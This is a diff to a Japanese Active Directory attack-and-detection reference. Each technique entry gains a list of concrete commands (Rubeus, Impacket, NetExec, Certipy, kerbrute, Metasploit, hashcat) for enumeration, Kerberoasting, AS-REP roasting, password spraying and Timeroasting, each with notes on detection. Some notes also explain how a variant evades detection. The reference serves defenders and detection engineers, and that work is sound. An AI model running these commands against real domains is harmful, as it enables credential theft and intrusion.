     "summary": "特権グループ(Domain Admins/Enterprise Admins/ローカルAdministrators)のメンバーを列挙し高価値標的を特定する",
     "how": "net group 'Domain Admins' /domain、Get-DomainGroupMember -Identity 'Domain Admins' -Recurse、Get-NetLocalGroup -ComputerName host(SAMR経由でリモートローカルグループ列挙)。ネストされたグループを再帰展開して実効的な特権保有者を洗い出し、横展開・昇格の標的を決める。",
     "tools": "net group/localgroup, PowerView Get-DomainGroupMember/Get-NetLocalGroup, NetExec --local-groups",
+    "cmd": [
+      {
+        "tool": "net.exe",
+        "t": "OS標準LOLBinで特権グループを列挙。単体は正規のヘルプデスク操作と区別できず直後の偵察/横展開との相関が必要",
+        "q": "net group \"Domain Admins\" /domain"
+      },
+      {
+        "tool": "net.exe",
+        "t": "リモートホストのローカルAdministratorsをSAMR経由で列挙。4624のネットワークログオン直後に多発すると偵察の兆候",
+        "q": "net localgroup Administrators \\\\fileserver01.corp.local"
+      },
+      {
+        "tool": "PowerView",
+        "t": "ネストされたグループを再帰展開し実効メンバーを洗い出す。4104のスクリプトブロックに関数名が残る",
+        "q": "Get-DomainGroupMember -Identity 'Domain Admins' -Recurse"
+      },
+      {
+        "tool": "PowerView",
+        "t": "SAMR経由でリモートホストのローカルグループを列挙。PowerShellだが4104ログに関数名が残り検知の手掛かりになる",
+        "q": "Get-NetLocalGroup -ComputerName fileserver01.corp.local"
+      },
+      {
+        "tool": "NetExec",
+        "t": "全ホストのローカルグループを一括収集。認証成功後にSAMR接続が連続するホスト数の急増が扇状偵察のシグナル",
+        "q": "nxc smb 10.0.0.0/24 -u svc_user -p 'Passw0rd!' --local-groups"
+      }
+    ],
     "detect": "特権グループへの集中的なLDAP列挙やSAMRによるリモートローカルグループ列挙が兆候。Domain Admins等の高価値グループへのアクセス(4662/4661)を重点監視。SAMR remote callの異常をMDIで検知する。",
     "events": "4662, 4661, 4799(ローカルグループ列挙)",
     "mitigate": "Restrict clients allowed to make remote calls to SAMでSAMR列挙を管理者限定に。特権グループのメンバーを最小化しPAM/PIM運用。4799(セキュリティ有効ローカルグループ列挙)の監査を有効化する。",
@@ -502,6 +843,33 @@ AD.I18N.ja.attacks = [
     "summary": "ドメインパスワードポリシーとロックアウト閾値を取得し、安全なパスワードスプレー戦略を設計する",
     "how": "net accounts /domain、Get-DomainPolicy、rpcclient getdompwinfo、NetExec --pass-pol でロックアウト閾値・観察期間・最小長を取得。きめ細かなパスワードポリシー(PSO, msDS-PasswordSettings)もLDAP列挙。ロックアウトを回避する試行回数と間隔を算出しパスワードスプレーの前提情報とする。",
     "tools": "net accounts, PowerView Get-DomainPolicy, rpcclient(getdompwinfo), NetExec --pass-pol",
+    "cmd": [
+      {
+        "tool": "net.exe",
+        "t": "OS標準でロックアウト閾値・最小パスワード長を取得。単体は正規のヘルプデスク操作と重なり検知しづらい",
+        "q": "net accounts /domain"
+      },
+      {
+        "tool": "PowerView",
+        "t": "LDAP経由でドメインパスワードポリシーをGPO設定オブジェクトから取得。4104に関数名が残るのみで通信自体は正規LDAP",
+        "q": "(Get-DomainPolicy).\"system access\""
+      },
+      {
+        "tool": "rpcclient",
+        "t": "匿名null session(SAMR)で認証なしにロックアウト閾値を取得。匿名接続の成立自体が高フィデリティな異常シグナル",
+        "q": "rpcclient -U '' -N 10.0.0.10 -c 'getdompwinfo'"
+      },
+      {
+        "tool": "NetExec",
+        "t": "SAMR経由でロックアウト閾値・観察期間を取得しスプレー間隔を算出。単体は低ノイズだが後続スプレーとの相関で検知",
+        "q": "nxc smb 10.0.0.10 -u svc_user -p 'Passw0rd!' --pass-pol"
+      },
+      {
+        "tool": "PowerView",
+        "t": "きめ細かなパスワードポリシー(PSO/msDS-PasswordSettings)をLDAPで直接検索。通常運用では稀なコンテナへの参照",
+        "q": "Get-DomainObject -SearchBase \"CN=Password Settings Container,CN=System,DC=corp,DC=local\""
+      }
+    ],
     "detect": "パスワードポリシーオブジェクトやPSOへのLDAPクエリ、rpcclientのgetdompwinfo呼び出しが兆候。直後にパスワードスプレー(多アカウントで単発4771/4625)が続くパターンを相関検知する。",
     "events": "4662, 後続の4771/4625/4740(ロックアウト)",
     "mitigate": "強固なパスワードポリシーとスマートロックアウト(Azure AD/Entra)を導入。スプレー検知のため多アカウント単発失敗にアラート。MFAを全面適用しポリシー情報の価値を下げる。",
@@ -542,6 +910,33 @@ AD.I18N.ja.attacks = [
     "summary": "AD CS(証明書テンプレート・CA・登録権限)を列挙しESC1〜ESC17等の脆弱な証明書テンプレート/CA誤設定を発見する。最新のESC16(全CAでszOID_NTDS_CA_SECURITY_EXT=SID拡張を無効化)やESC17(SAN許容のServer-Authテンプレ経路)もCertipy 5.xの列挙対象。",
     "how": "認証済みユーザーでCertify.exe find /vulnerable、certipy find -vulnerable -u user@corp -p pass によりCA構成とテンプレートのenrollment権限・EKU・msPKI属性をLDAP列挙。誤設定(ENROLLEE_SUPPLIES_SUBJECT, Any Purpose EKU, 危険なACL)からESC1〜ESC16の権限昇格経路を特定する。PKIオブジェクトはConfigurationパーティションに存在。",
     "tools": "Certify, Certipy, PSPKIAudit, Locksmith(防御側監査)",
+    "cmd": [
+      {
+        "tool": "Certify",
+        "t": "認証済みユーザーで列挙可能なESC1等の脆弱テンプレートを判定。`find /vulnerable`のコマンドライン文字列が主軸",
+        "q": "Certify.exe find /vulnerable"
+      },
+      {
+        "tool": "Certify",
+        "t": "現在のトークンが保持するグループのみでenrollment権限を評価する軽量版。`/currentuser`はESC権限昇格の前段でよく出現",
+        "q": "Certify.exe find /vulnerable /currentuser"
+      },
+      {
+        "tool": "Certipy",
+        "t": "CA構成・テンプレートACLをLDAPで列挙しESC1〜16を判定。Linux側でプロセスログは残らずDCのLDAP検索のみが手掛かり",
+        "q": "certipy find -u user@corp.local -p 'Passw0rd!' -dc-ip 10.0.0.10 -vulnerable -enabled -hide-admins"
+      },
+      {
+        "tool": "Certipy",
+        "t": "`-json`で機械可読出力しBloodHound等の後続解析に連携。出力形式が違うだけで発生するLDAP検索量は同じ",
+        "q": "certipy find -u user@corp.local -p 'Passw0rd!' -dc-ip 10.0.0.10 -vulnerable -json"
+      },
+      {
+        "tool": "PowerView",
+        "t": "Configurationパーティション配下のPKIコンテナを直接検索。通常運用でここへ検索をかけるプロセスは限られる",
+        "q": "Get-DomainObject -SearchBase \"CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local\" -LDAPFilter \"(objectClass=pKICertificateTemplate)\""
+      }
+    ],
     "detect": "Configurationパーティションの証明書テンプレート/pKIEnrollmentServiceへの列挙アクセスが兆候。CA上の証明書要求(4886/4887)の異常や、脆弱テンプレートへのenrollmentを監視する。Certipy/Certifyの特徴的LDAPクエリを検出する。",
     "events": "4662(PKIオブジェクト), 4886, 4887(証明書発行)",
     "mitigate": "Locksmith/PSPKIAuditで脆弱テンプレートを棚卸しESC1等を修正(ENROLLEE_SUPPLIES_SUBJECT無効化、Manager承認要求)。CA監査を有効化しenrollment権限を最小化する。2025年2月以降のKerberos証明書マッピングFull Enforcement(KB5014754)で弱いUPN/SANマッピングを排し、szOID_NTDS_CA_SECURITY_EXT(SID拡張)を全CAで有効化してESC16を封じる。Windows Server 2025のWeb登録はEPA(Extended Protection for Authentication)が既定有効。",
@@ -577,6 +972,33 @@ AD.I18N.ja.attacks = [
     "summary": "Kerberos委任(制約なし/制約付き/リソースベース)が設定されたアカウントを列挙し特権昇格の標的を特定する",
     "how": "LDAPで userAccountControl のTRUSTED_FOR_DELEGATION(制約なし)や msDS-AllowedToDelegateTo(制約付き)、msDS-AllowedToActOnBehalfOfOtherIdentity(RBCD)を検索。Get-NetComputer -Unconstrained、findDelegation.py、PowerView Get-DomainComputer -TrustedToAuth で列挙。制約なし委任ホストは後続のプリンタバグ/coerce攻撃でTGT窃取の標的になる。",
     "tools": "PowerView(Get-DomainComputer -Unconstrained/-TrustedToAuth), findDelegation.py(impacket), BloodHound, Certipy",
+    "cmd": [
+      {
+        "tool": "PowerView",
+        "t": "userAccountControlのTRUSTED_FOR_DELEGATIONビット(0x80000)で無制約委任ホストを検索。Coerce連鎖の起点特定に直結",
+        "q": "Get-DomainComputer -Unconstrained -Properties dnshostname,distinguishedname"
+      },
+      {
+        "tool": "PowerView",
+        "t": "msDS-AllowedToDelegateToが設定された制約付き委任ホストを列挙。属性の存在自体が委任構成の裏付けになる",
+        "q": "Get-DomainComputer -TrustedToAuth -Properties dnshostname,msds-allowedtodelegateto"
+      },
+      {
+        "tool": "PowerView",
+        "t": "RBCD(リソースベース制約付き委任)が設定済みのオブジェクトをLDAPフィルタで直接検索。設定自体が稀で高フィデリティ",
+        "q": "Get-DomainComputer -LDAPFilter \"(msDS-AllowedToActOnBehalfOfOtherIdentity=*)\" -Properties samaccountname"
+      },
+      {
+        "tool": "Impacket",
+        "t": "3種の委任フラグをLDAPで一括列挙。Linux側のため端末プロセスログはなくDCのLDAP検索量のみが痕跡",
+        "q": "findDelegation.py corp.local/svc_user:'Passw0rd!' -dc-ip 10.0.0.10"
+      },
+      {
+        "tool": "PowerShell",
+        "t": "署名済みRSAT ADモジュールでの列挙のため実行ファイル検知は効かない。4104のスクリプトブロックが唯一の手掛かり",
+        "q": "Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation,msDS-AllowedToDelegateTo"
+      }
+    ],
     "detect": "委任関連属性(userAccountControl, msDS-AllowedToDelegateTo等)への集中的LDAPクエリが兆候。BloodHound収集の一部として現れることが多く、DS Access監査で相関する。委任設定変更(5136)も監視対象。",
     "events": "4662, 5136(委任属性変更)",
     "mitigate": "制約なし委任を撤廃しリソースベース制約付き委任へ移行。特権アカウントに'Account is sensitive and cannot be delegated'/Protected Users を設定。委任設定を定期監査しTier分離を徹底する。",
@@ -617,6 +1039,38 @@ AD.I18N.ja.attacks = [
     "summary": "SPNが設定されたサービスアカウントのTGS-REP(サービスチケット)を要求し、サービスアカウントのパスワードハッシュで暗号化された部分をオフラインで総当たりしてパスワードを復元する攻撃。従来はRC4-HMAC(NTハッシュそのもので、ソルトも反復もなく高速に解読できる)が主戦場だったが、CVE-2022-37966(2022年11月更新/KB5021131)でAES-SHA1が既定の暗号化種別となり、さらにWindows Server 2025のDCはRC4のTGTを既定で発行しなくなった。MicrosoftはCVE-2026-20833(KB5073381)としてAD DCの既定想定暗号化種別からRC4を段階的に無効化しており(2026年1月に監査、4月にDefaultDomainSupportedEncTypesの既定をAES-SHA1のみへ変更する強制、7月にロールバック不可の恒久化)、既にほぼ有効化されている。ただしAESのサービスチケットも依然ロースト可能で(AES128で約350倍、AES256で約700倍、解読が遅くなるだけ)、攻撃の主軸は弱いパスワードのAESアカウントと、RC4が明示的に許可された既存/アップグレード済みドメインへのダウングレードへ移りつつある。",
     "how": "任意のドメイン認証済みユーザー(低権限で十分)でLDAPからservicePrincipalNameを持つユーザーアカウントを列挙し、それらSPNに対してTGS-REQを送りTGS-REPを取得する。KDCはサービスアカウントのNTLMハッシュ(RC4)またはAES鍵でチケットの一部を暗号化するため、それをオフラインでhashcat(-m 13100=TGS-REP RC4 / -m 19600=AES128 / -m 19700=AES256)で辞書・総当たりする。RC4鍵はNTハッシュそのもの(ソルト・反復なし)で解読が高速なため、攻撃者はRubeusの/tgtdelegやetype指定でRC4(0x17)へのダウングレードを明示的に要求する。ただしWindows Server 2025のDCはRC4のTGTを既定で発行せず、RC4をハード無効化(DefaultDomainSupportedEncTypes=0x18)したドメインではダウングレード要求はKDC_ERR_ETYPE_NOTSUPP(失敗コード0xE)で拒否される。その場合はAES(0x11/0x12)のサービスチケットをローストするしかなく、AES鍵はPBKDF2(4096回反復)由来で解読が約350〜700倍遅いため、弱いパスワードのアカウントが主な標的となる。前提はドメイン内の有効なアカウント1つのみで、対象アカウントへのアクセスは不要。",
     "tools": "Rubeus (kerberoast /nowrap /rc4opsec), impacket GetUserSPNs.py, PowerView Invoke-Kerberoast, mimikatz kerberos::list /export, hashcat -m 13100/19600/19700",
+    "cmd": [
+      {
+        "tool": "Rubeus",
+        "t": "全SPNアカウントのTGSを要求しhash形式で出力。`kerberoast` と `/nowrap` が最も残りやすい文字列",
+        "q": "Rubeus.exe kerberoast /outfile:hashes.txt /nowrap"
+      },
+      {
+        "tool": "Rubeus",
+        "t": "AES専用アカウントを除外しRC4暗号化を強制しない低ノイズ版。4769のRC4偏りが出ないため暗号種別だけの検知はすり抜ける",
+        "q": "Rubeus.exe kerberoast /rc4opsec /stats"
+      },
+      {
+        "tool": "Impacket",
+        "t": "Linux側から直接TGSを要求。攻撃元のプロセスログは残らずDCの4769とLDAP照会で見るしかない",
+        "q": "GetUserSPNs.py -request -dc-ip 10.0.0.10 corp.local/svc_user:'Passw0rd!' -outputfile hashes.txt"
+      },
+      {
+        "tool": "PowerView",
+        "t": "PowerShell内で完結するためファイルが落ちない。4104のスクリプトブロックに関数名が残る",
+        "q": "Invoke-Kerberoast -OutputFormat Hashcat | Export-Csv -NoTypeInformation kerb.csv"
+      },
+      {
+        "tool": "setspn.exe",
+        "t": "OS標準LOLBinでのSPN棚卸し。単体では正規運用と重なるので直後のTGS要求と相関させる",
+        "q": "setspn.exe -T corp.local -Q */*"
+      },
+      {
+        "tool": "Hashcat",
+        "t": "持ち出し後のオフライン解析。モード13100=RC4のTGS-REPで、13100の出現自体がKerberoast成立の裏付け",
+        "q": "hashcat -m 13100 -a 0 hashes.txt rockyou.txt -r best64.rule"
+      }
+    ],
     "detect": "イベントID 4769(Kerberosサービスチケット要求)を監視し、単一アカウントが短時間に多数の異なるSPNへTGS要求を発行するパターンを検知する。暗号化種別ではTicket Encryption Type 0x17(RC4)が古典的指標だが、AES強制/Windows Server 2025環境ではRC4要求自体がダウングレードの強い兆候であり、RC4が無効化されていればそのダウングレード要求は失敗コード0xE(KDC_ERR_ETYPE_NOTSUPP)として現れる。RC4無効化が進むとローストはAES(0x11/0x12)へ移るため、0x17だけでなく単一アカウントによる多数SPNへのAESサービスチケット要求の急増も監視対象とする。Ticket Optionsやクライアントアドレスの偏りも指標になる。EDR側ではRubeus/GetUserSPNs/PowerViewの実行やLDAPでのservicePrincipalName一括列挙を併せて相関させる。",
     "events": "4769 (Ticket Encryption Type 0x17=RC4-HMAC が古典的な主指標; RC4無効化/Windows Server 2025環境では 0x11=AES128 / 0x12=AES256 のサービスチケット要求と、RC4ダウングレード拒否を示す失敗コード 0xE=KDC_ERR_ETYPE_NOTSUPP も指標), 補助的に4768 (TGT要求; WS2025のDCはRC4のTGTを既定で発行しない)",
     "mitigate": "サービスアカウントには25文字以上のランダムなパスワードまたはgMSA/dMSAを使用する(gMSA/dMSAは自動ローテーションされる長大な鍵でロースト耐性が高い)。ドメイン全体でAES暗号化を強制し、RC4は可能な限りハード無効化する(GPO『Kerberosで許可する暗号化の種類』でAES128/256のみ許可、またはDCで DefaultDomainSupportedEncTypes=0x18 を設定)。Windows Server 2025のDCはRC4のTGTを既定で発行せず、MicrosoftはCVE-2026-20833(KB5073381)としてRC4を段階的に無効化した(2026年1月に監査、4月にDefaultDomainSupportedEncTypesの既定をAES-SHA1のみへ変更、7月にロールバック不可で恒久化)ため、RC4依存(EID 4768/4769やMicrosoftのKerberos-Cryptoスクリプトで棚卸し)を早急に解消する。AESでも弱いパスワードは解読され得るため強度確保は必須。不要なSPNを削除し、サービスアカウントを保護グループや認証ポリシーで制限、定期的なパスワードローテーションとハニーSPNアカウントによる早期検知を導入する。",
@@ -652,6 +1106,33 @@ AD.I18N.ja.attacks = [
     "summary": "攻撃者が対象ユーザーオブジェクトへの書き込み権限(GenericWrite/WriteProperty)を持つ場合、一時的にSPNを付与してKerberoast可能にし、ハッシュ取得後にSPNを削除する攻撃。",
     "how": "対象アカウントに対しWriteProperty/GenericWrite/GenericAllを持つ状態が前提。servicePrincipalName属性に任意のSPN(例 fake/host)を書き込み、そのアカウントをKerberoastしてTGS-REPを取得、オフラインでクラック後にSPNを元に戻して痕跡を消す。SPNを持たないユーザーも標的化できる点が通常のKerberoastとの違い。",
     "tools": "PowerView Set-DomainObject -Set servicePrincipalName, targetedKerberoast.py, Rubeus, BloodHoundでの書き込み権限特定",
+    "cmd": [
+      {
+        "tool": "PowerView",
+        "t": "書き込み権限のある対象アカウントに偽SPNを一時付与しKerberoast可能にする。`servicePrincipalName`変更が4738で残る",
+        "q": "Set-DomainObject -Identity victim_user -Set @{serviceprincipalname='fake/BLAHBLAH'}"
+      },
+      {
+        "tool": "PowerView",
+        "t": "付与した偽SPNに対しTGSを要求しハッシュを取得。直前の4738と直後の4769のペアが相関のポイント",
+        "q": "Get-DomainSPNTicket -Identity victim_user | fl"
+      },
+      {
+        "tool": "PowerView",
+        "t": "痕跡を消すためSPN属性をクリア。数秒〜数分内でのSPN付与→削除の往復が高シグナルなパターン",
+        "q": "Set-DomainObject -Identity victim_user -Clear serviceprincipalname"
+      },
+      {
+        "tool": "targetedKerberoast",
+        "t": "SPN付与からTGS取得・削除までをLinux側から自動化。DCには4738と4769のみ残り攻撃元プロセスログは無い",
+        "q": "targetedKerberoast.py -d corp.local -u svc_user -p 'Passw0rd!' --dc-ip 10.0.0.10 --request-user victim_user -o victim.hash"
+      },
+      {
+        "tool": "NetExec",
+        "t": "`--targeted-kerberoast`で特定アカウントのみ狙い撃ち。全SPN一括要求より4769が少なく通常のKerberoast検知網をすり抜けやすい",
+        "q": "netexec ldap 10.0.0.10 -u svc_user -p 'Passw0rd!' --kerberoasting output.txt --targeted-kerberoast victim_user"
+      }
+    ],
     "detect": "servicePrincipalName属性の変更を示すイベントID 5136(ディレクトリサービスオブジェクト変更)を監視し、SPN付与直後の4769、その後のSPN削除という一連のシーケンスを相関分析する。通常ユーザーにSPNが突然設定されるのは強い異常シグナル。",
     "events": "5136 (servicePrincipalName変更), 4769, 4738",
     "mitigate": "ユーザーオブジェクトへの過剰なWrite権限(ACL)を棚卸しして最小化し、SPN属性変更のSACL監査を有効化する。BloodHoundで攻撃経路を可視化し危険な委任権限を除去、AES強制でクラックコストを上げる。",
@@ -692,6 +1173,28 @@ AD.I18N.ja.attacks = [
     "summary": "事前認証が無効(DONT_REQ_PREAUTH)なアカウント、または対象への書き込み権限を悪用し、認証済みアカウントを一切使わずAS-REQ経由でKerberoast可能なチケット材料を取得する亜種。",
     "how": "対象アカウントのUserAccountControlでDONT_REQUIRE_PREAUTHを設定できる書き込み権限があるか、既に無効化されている前提。AS-REQを送り、通常はTGTのAS-REPだが、SPNを指定することでサービスチケット相当の暗号化ブロブを事前認証なしに取得しオフラインクラックする。ドメイン資格情報を持たない立場からも実行しうる。",
     "tools": "impacket GetUserSPNs.py -no-preauth(事前認証不要アカウントを踏み台にした無認証Kerberoast), RoastInTheMiddle(AS-REQ MitM PoC), 改変版Rubeus(AS-REQロースト対応, Semperis PR #139), hashcat -m 13100",
+    "cmd": [
+      {
+        "tool": "Impacket",
+        "t": "事前認証不要アカウントを踏み台にAS-REQのsnameを書き換えTGS相当を無認証で取得。`-no-preauth`が唯一の識別点",
+        "q": "GetUserSPNs.py -no-preauth svc_user -usersfile users.txt -dc-host dc01.corp.local corp.local/"
+      },
+      {
+        "tool": "RoastInTheMiddle",
+        "t": "ARPスポーフィングでAS-REQを傍受・改変再送してロースト。DC側では同一送信元から4768/4769が短時間に集中する",
+        "q": "RoastInTheMiddle.exe kerberoast /listenip:10.0.0.50 /targets:10.0.0.20,10.0.0.21 /dcs:10.0.0.10 /spns:svc_user"
+      },
+      {
+        "tool": "PowerView",
+        "t": "前提となるDONT_REQ_PREAUTHアカウントの事前列挙。特定LDAPフィルタでの大量問い合わせが手掛かりになる",
+        "q": "Get-DomainUser -PreauthNotRequired -Properties samaccountname"
+      },
+      {
+        "tool": "Hashcat",
+        "t": "取得した暗号化ブロブをオフライン総当たり。通常のKerberoastと同じ13100系フォーマットで解析できる",
+        "q": "hashcat -m 13100 hashes.txt rockyou.txt -r best64.rule"
+      }
+    ],
     "detect": "事前認証なしのAS-REQを示すイベントID 4768でPreAuthType=0(事前認証なし)を監視し、SPN付きの要求やRC4暗号化タイプを検知する。UserAccountControlのDONT_REQ_PREAUTHフラグ変更(4738)も追跡する。",
     "events": "4768 (Pre-Auth Type 0), 4738 (UAC変更)",
     "mitigate": "全アカウントで事前認証を必須(DONT_REQ_PREAUTHを解除)にし、UAC属性変更を監査する。SPN書き込み権限を制限、AES強制、定期的な設定ドリフト検査を実施する。",
@@ -732,6 +1235,33 @@ AD.I18N.ja.attacks = [
     "summary": "Kerberos事前認証が無効化されたアカウントに対しAS-REQを送信し、返されるAS-REPの暗号化部分(ユーザーパスワード鍵で暗号化)をオフラインで総当たりしてパスワードを復元する攻撃。",
     "how": "LDAPフィルタ(userAccountControl:1.2.840.113556.1.4.803:=4194304)でDONT_REQ_PREAUTHが立つアカウントを列挙する。認証情報なしでも(ユーザー名リストがあれば)AS-REQを送ってAS-REPを取得し、hashcat -m 18200 (RC4)でクラック。ドメイン内の低権限アカウントがあれば列挙が容易だが、無認証でもユーザー名推測で試行可能。",
     "tools": "Rubeus asreproast, impacket GetNPUsers.py, PowerView Get-DomainUser -PreauthNotRequired, Kerbrute, hashcat -m 18200 (AS-REP RC4)",
+    "cmd": [
+      {
+        "tool": "Rubeus",
+        "t": "DONT_REQ_PREAUTHアカウント全体のAS-REPをhashcat形式で回収。`asreproast`という文字列自体が主要シグナル",
+        "q": "Rubeus.exe asreproast /format:hashcat /outfile:hashes.txt"
+      },
+      {
+        "tool": "Rubeus",
+        "t": "特定ユーザーのみ狙い撃ちしノイズを抑える版。単発の4768(事前認証なし)として残るだけで発見が難しい",
+        "q": "Rubeus.exe asreproast /user:svc_user /nowrap"
+      },
+      {
+        "tool": "Impacket",
+        "t": "`-no-pass`指定で無認証実行可能。ユーザー名リストさえあれば資格情報なしでAS-REPを収集できる",
+        "q": "GetNPUsers.py corp.local/ -usersfile users.txt -no-pass -outputfile hashes.txt -dc-ip 10.0.0.10"
+      },
+      {
+        "tool": "kerbrute",
+        "t": "ユーザー列挙中に事前認証不要アカウントを検出すると同時にAS-REPハッシュも回収する",
+        "q": "kerbrute userenum -d corp.local --dc dc01.corp.local users.txt --hash-file hashes.txt"
+      },
+      {
+        "tool": "Hashcat",
+        "t": "RC4で暗号化されたAS-REP部分をクラック。モード18200の出現自体がAS-REP Roast成立の裏付けになる",
+        "q": "hashcat -m 18200 hashes.txt rockyou.txt"
+      }
+    ],
     "detect": "イベントID 4768でPre-Authentication Type=0(事前認証なし)かつRC4暗号化タイプの要求を検知する。正規ユーザーが事前認証なしで認証するのは稀であり、そうしたアカウントへのAS-REQ発生自体が高精度なシグナル。短時間の複数アカウント列挙も指標。",
     "events": "4768 (Pre-Auth Type=0, Encryption Type 0x17)",
     "mitigate": "全アカウントで事前認証を有効化(DONT_REQ_PREAUTHフラグ除去)し、定期的にこのフラグを持つアカウントを棚卸しして削除する。強力なパスワードとAES暗号化を強制、ハニーアカウントに同フラグを設定して検知トラップにする。",
@@ -767,6 +1297,33 @@ AD.I18N.ja.attacks = [
     "summary": "AS-REQの事前認証(PA-ENC-TIMESTAMP)にパスワード派生鍵を用いる仕様を悪用し、KDCの応答(成功/失敗/エラーコード)から有効ユーザー名の列挙や少数パスワードのスプレーを行う攻撃。NTLMより速くロックアウトも回避しやすい。",
     "how": "TCP/UDP 88に対しユーザー名だけのAS-REQを送るとKDC-ERR-PREAUTH-REQUIRED(有効ユーザー)かKDC-ERR-C-PRINCIPAL-UNKNOWN(無効)が返り、無認証でユーザー列挙が可能。次に共通パスワード(例 Season2026!)を全ユーザーにスプレーし、成功すればAS-REPが返る。1ユーザー1試行に抑えてアカウントロックアウト閾値を回避する。",
     "tools": "Kerbrute (userenum / passwordspray), Rubeus brute, NetExec kerberos, MSF, Spray365",
+    "cmd": [
+      {
+        "tool": "kerbrute",
+        "t": "AS-REQのエラーコード差(PREAUTH_REQUIRED/PRINCIPAL_UNKNOWN)で無認証ユーザー列挙。4625を出さずに済む",
+        "q": "kerbrute userenum -d corp.local --dc dc01.corp.local users.txt"
+      },
+      {
+        "tool": "kerbrute",
+        "t": "列挙済みユーザーへ1パスワードだけスプレー。1ユーザー1試行のためアカウントロックアウト閾値を回避しやすい",
+        "q": "kerbrute passwordspray -d corp.local --dc dc01.corp.local users.txt 'Season2026!'"
+      },
+      {
+        "tool": "Rubeus",
+        "t": "ユーザー×パスワードリストでKerberos事前認証をブルートフォース。TCP/UDP 88への集中アクセスが特徴",
+        "q": "Rubeus.exe brute /users:users.txt /passwords:passwords.txt /domain:corp.local /outfile:hits.txt"
+      },
+      {
+        "tool": "Metasploit",
+        "t": "KDCの応答差分から無認証でユーザー存在を判定する専用モジュール。NTLMのログオン失敗(4625)を経由しない",
+        "q": "use auxiliary/gather/kerberos_enumusers\nset RHOSTS 10.0.0.10\nset DOMAIN corp.local\nset USER_FILE users.txt\nrun"
+      },
+      {
+        "tool": "Metasploit",
+        "t": "Kerberos事前認証でのパスワード検証を機械的に試行。成功はAS-REP受信、失敗は4771系イベントとして残る",
+        "q": "use auxiliary/scanner/kerberos/kerberos_login\nset RHOSTS 10.0.0.10\nset DOMAIN corp.local\nset USER_FILE users.txt\nset PASSWORD 'Season2026!'\nrun"
+      }
+    ],
     "detect": "イベントID 4768の大量発生、特にResult Code 0x6(不明プリンシパル/列挙)や0x18(事前認証失敗=誤パスワード)が単一送信元IPから多数アカウントに広がるパターンを検知する。4771(事前認証失敗)の急増、短時間・低頻度の分散試行(スプレー特有)も相関で捉える。",
     "events": "4768, 4771 (Failure Code 0x18), 4776, 4740(ロックアウト)",
     "mitigate": "強固なパスワードポリシーとMFA、スマートロックアウトを導入し、Kerberos認証元の異常IPをネットワークで制限する。ハニーアカウントの試行監視、認証失敗レート監視とSIEM相関、KDC 88ポートへの外部露出禁止を徹底する。",
@@ -807,6 +1364,23 @@ AD.I18N.ja.attacks = [
     "summary": "Windowsの認証付きNTP(MS-SNTP)が応答のMACをコンピュータアカウントのNTLMハッシュ(MD5)で計算する仕様を悪用し、事前認証もドメイン資格情報も無しにコンピュータアカウントのハッシュを収集しオフラインクラックする攻撃。",
     "how": "ドメイン参加不要・未認証の立場から、DC(NTPサーバ)へ拡張認証フィールドにコンピュータアカウントのRIDを入れたNTPリクエストを送信する。DCはそのアカウントのMD5(NTLMハッシュ)ベースのMACを付けて応答するため、それを収集しhashcat(モード 31300)でクラック。RIDを総当たりして全コンピュータアカウントのハッシュを列挙可能。弱いパスワードのコンピュータ/信頼アカウントが標的。",
     "tools": "timeroast.py(Tom Tervoort / Secura BV, github.com/bvcyber/Timeroast), NetExec の timeroast モジュール, hashcat -m 31300(MS-SNTP), カスタムNTP/SNTPクライアント",
+    "cmd": [
+      {
+        "tool": "timeroast.py",
+        "t": "全RID(コンピュータ/信頼アカウント)へMS-SNTPリクエストを送りMACハッシュを回収。無認証・UDP123のみで完結する",
+        "q": "python3 timeroast.py 10.0.0.10 | tee ntp-hashes.txt"
+      },
+      {
+        "tool": "NetExec",
+        "t": "`-M timeroast`モジュールで同等の収集を自動化。認証情報不要でSMB445すら使わない特異な通信パターン",
+        "q": "netexec smb 10.0.0.10 -M timeroast"
+      },
+      {
+        "tool": "Hashcat",
+        "t": "MS-SNTPのMACをオフライン解読。モード31300の出現自体がTimeroasting成立の直接証拠になる",
+        "q": "hashcat -m 31300 ntp-hashes.txt rockyou.txt"
+      }
+    ],
     "detect": "従来のKerberosイベントには現れにくいため、DCのNTP/UDP 123に対する認証付きSNTP要求の異常な量・連続するRID指定パターンをネットワーク/ファイアウォールログで監視する。単一送信元から多数の異なるコンピュータRID宛の応答を伴うトラフィックが指標。",
     "events": "ネットワークログ(UDP 123 MS-SNTP), 標準Kerberosイベントには非出現",
     "mitigate": "コンピュータアカウントは通常自動生成の強力なパスワードだが、手動設定や古い弱パスワードの信頼アカウントを排除する。DCのNTP認証(MS-SNTP)を必要な範囲に限定しUDP 123へのアクセスを制御、可能なら認証付きNTPを無効化しセキュアな時刻同期に移行する。",
@@ -837,6 +1411,23 @@ AD.I18N.ja.attacks = [
     "summary": "ドメイン/フォレスト信頼に使われる信頼アカウント(TDO)の共有鍵をKerberoast/AS-REP同様の手法で狙い、inter-realm TGTの暗号化材料からオフラインで信頼鍵を復元しようとする亜種。",
     "how": "信頼関係の相手ドメインを表すtrustアカウント(例 DOMAIN$ 相当のインターリアルム鍵)に対して、SPN経由またはAS-REP経由でチケット材料を取得しオフラインクラックする。前提はドメイン認証済みアカウント。成功すれば信頼鍵を用いて偽のinter-realm TGT(信頼チケット)を鋳造し、信頼先ドメインへ横展開できる。ただしNetlogonが信頼鍵を約30日周期で自動更新するため、クラックが現実的なのは鍵設定直後や、手動設定・DSC未使用で生成された弱い信頼鍵に限られる。",
     "tools": "Rubeus, impacket, hashcat, 信頼アカウント列挙用LDAPクエリ",
+    "cmd": [
+      {
+        "tool": "PowerView",
+        "t": "専用の公開ロースト実行ツールは無く、前提となる信頼関係(TDO)オブジェクトの列挙がまず観測される起点になる",
+        "q": "Get-DomainTrust -Domain corp.local"
+      },
+      {
+        "tool": "dsacls",
+        "t": "信頼オブジェクト(TDO)のACLを確認するOS標準LOLBin。通常運用のAD管理でも使われるため単体では低シグナル",
+        "q": "dsacls \"CN=partner.local,CN=System,DC=corp,DC=local\""
+      },
+      {
+        "tool": "Hashcat",
+        "t": "信頼鍵材料が取得できた場合のオフライン総当たり。通常Kerberoastと同じ13100/18200系フォーマットで解析する",
+        "q": "hashcat -m 13100 trust_hashes.txt rockyou.txt"
+      }
+    ],
     "detect": "信頼アカウント(名前が末尾$の信頼オブジェクト)に対する4769/4768要求、特にRC4暗号化タイプを監視する。通常発生しない信頼アカウント向けのTGS要求は高精度シグナル。",
